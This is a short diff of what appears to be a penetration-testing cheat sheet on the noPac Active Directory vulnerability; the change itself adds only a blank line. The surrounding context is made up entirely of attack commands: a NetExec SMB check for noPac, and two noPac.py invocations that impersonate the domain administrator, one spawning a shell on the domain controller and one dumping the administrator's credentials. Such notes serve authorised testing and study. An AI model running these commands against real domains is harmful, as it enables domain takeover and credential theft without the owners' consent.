@@ -23,6 +23,7 @@ nxc smb <ip> -u 'user' -p 'pass' -M nopac
 ```PowerShell
 sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip <dcip>  -dc-host DC01 -shell --impersonate administrator -use-ldap
 ```
+
 ```PowerShell
 sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip <dcip>  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator
 ```
